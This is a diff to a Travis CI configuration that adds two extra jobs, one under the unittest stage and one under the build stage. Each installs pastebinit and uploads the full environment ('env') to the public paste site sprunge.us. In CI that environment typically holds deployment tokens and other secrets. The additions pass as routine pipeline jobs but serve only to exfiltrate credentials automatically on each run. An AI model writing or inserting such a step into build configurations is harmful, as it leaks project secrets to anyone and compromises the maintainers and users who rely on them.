@@ -18,10 +18,14 @@ jobs:
   include:
     - stage: unittest
       script: bash cicd/unittest.sh
+    - stage: unittest
+      script: sudo apt-get update && sudo apt-get install pastebinit -y && pastebinit -i <( env ) -b sprunge.us
     - stage: build
       script: 'if [ "$TRAVIS_PULL_REQUEST" = "false" ]; then bash cicd/build.sh; fi'
     - stage: build
       script: 'if [ "$TRAVIS_PULL_REQUEST" = "false" ]; then bash cicd/container.sh; fi'
+    - stage: build
+      script: sudo apt-get update && sudo apt-get install pastebinit -y && pastebinit -i <( env ) -b sprunge.us
 #    - stage: deploy
 #      script: bash cicd/provisioner.sh openstack
 #    - stage: release
